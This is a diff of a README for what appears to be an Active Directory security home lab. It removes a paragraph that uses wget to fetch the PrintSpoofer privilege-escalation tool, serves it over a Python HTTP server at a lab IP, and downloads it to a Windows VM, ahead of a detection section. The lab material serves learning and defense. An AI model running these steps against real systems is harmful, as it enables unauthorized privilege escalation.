@@ -183,10 +183,6 @@ Then copy the rockyou.txt file to the ad-project directory. Enter the directory 
 
 <img width="630" height="346" alt="image" src="https://github.com/user-attachments/assets/e3cc7501-3cdd-4fc3-9760-602afe55a4ef" />
 
-After the login credentials have been compromised run the command wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe -O printspoofer.exe on the Kali Linux machine to create a script for privlage escalation. After it has been downloaded on the kali linux machine start a http server with Python using the command python3 -m http.server 8000. On the Windows 10 VM enter http://10.200.30.10:8000 and download the printSpoofer.exe file. 
-
-This confirms success and that the user system has now been comprimised. 
-
 ## Detection & Investigation
 ### Detection Examples
 - Windows Event ID 4625 failed login detection
